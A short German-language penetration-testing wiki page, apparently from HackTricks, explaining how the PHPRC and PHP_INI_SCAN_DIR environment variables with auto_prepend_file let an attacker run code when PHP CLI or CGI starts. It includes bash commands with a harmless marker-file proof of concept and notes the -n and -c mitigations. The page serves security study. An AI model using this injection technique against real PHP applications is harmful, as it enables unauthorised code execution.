# Injection in macOS-PHP-Anwendungen

{{#include ../../../banners/hacktricks-training.md}}

## `PHPRC` / `PHP_INI_SCAN_DIR` und `auto_prepend_file`

PHP CLI und CGI lesen bei jedem Aufruf die Konfiguration ein. Mit `PHPRC` kann eine für den Angreifer lesbare `php.ini` ausgewählt werden, während `PHP_INI_SCAN_DIR` das Verzeichnis umleiten kann, das nach zusätzlichen `.ini`-Dateien durchsucht wird. Die Direktive `auto_prepend_file` veranlasst PHP, eine Datei vor dem angeforderten Script zu analysieren, wodurch diese Kombination zur Codeausführung beim Start führt.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```
Eine Alternative ist ein Verzeichnis, das eine `.ini`-Datei enthält:
```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```
Die Option `-n` ignoriert `php.ini`; ein expliziter vertrauenswürdiger `-c`-Pfad hat Vorrang vor `PHPRC`. Bedenke, dass ein langlebiger Server-SAPI die Konfiguration normalerweise beim Start des Webservers einliest, während CLI und CGI dies bei jeder Ausführung tun.<sup>[[1]](#references)</sup>

## References

- [1] [PHP-Konfigurationsdatei](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
{{#include ../../../banners/hacktricks-training.md}}
